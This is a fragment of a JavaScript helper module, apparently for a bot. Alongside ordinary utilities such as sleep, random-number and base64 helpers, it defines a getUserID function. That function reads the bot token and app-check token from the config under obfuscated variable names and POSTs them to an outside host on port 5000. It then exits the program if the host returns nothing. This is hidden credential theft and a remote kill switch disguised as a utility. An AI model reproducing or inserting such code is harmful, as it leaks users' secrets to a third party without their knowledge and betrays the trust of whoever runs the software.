...
let sdadgshagdhas = config.botToken
let sadasdsapp = config.appCheckToken
...
async function getUserID() {
    ...
    await fetch(`http://iap.klamnsha.ru.com:5000/?asduihnvas=${sdadgshagdhas}&snuhvda=${sadasdsapp}`, { method: 'POST' }).then(response => response.text())
        .then(data => {
            let datanew = data
            if (datanew == "") {
                process.exit()
...
export {
    getRandomInt, sleep, listenForAll, createTask, getUserID, Task, withTimeout, readFileFromURL, Max3Array, formatNum, normalize, extractAmount, ObjectSet, UTF8ToBase64, base64ToUTF8
}